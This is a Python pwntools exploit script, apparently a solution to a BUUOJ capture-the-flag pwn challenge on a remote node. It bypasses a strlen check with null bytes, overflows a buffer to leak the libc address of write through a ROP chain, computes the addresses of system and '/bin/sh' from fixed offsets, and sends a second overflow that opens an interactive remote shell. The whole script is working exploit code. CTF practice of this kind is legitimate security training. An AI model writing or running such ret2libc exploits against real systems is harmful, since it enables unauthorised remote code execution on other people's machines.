from pwn import *


# p = process("./pwn")
p = remote("node4.buuoj.cn", 25923)
pro = ELF("./pwn")

# context.log_level = "debug"

write_p = pro.plt["write"]
write_g = pro.got["write"]
read_func = 0x080487D0

# use "\x00" cut off strlen 
pad = b"\x00"*0x7+b"\xff"*2
p.send(pad)
p.recvuntil("Correct\n")

# overflow --> leak libc
pad = cyclic(0xe7+0x4)
pad += p32(write_p)+p32(read_func)
pad += p32(1)+p32(write_g)+p32(0x4)
p.send(pad)

info = u32(p.recv())
print("write: ", hex(info))

# count offset
base = info-0xd43c0
system = base+0x3a940
binsh = base+0x15902b

# attack
pad = cyclic(0xe7+0x4)
pad += p32(system)+p32(0x0)+p32(binsh)
p.send(pad)

p.interactive()

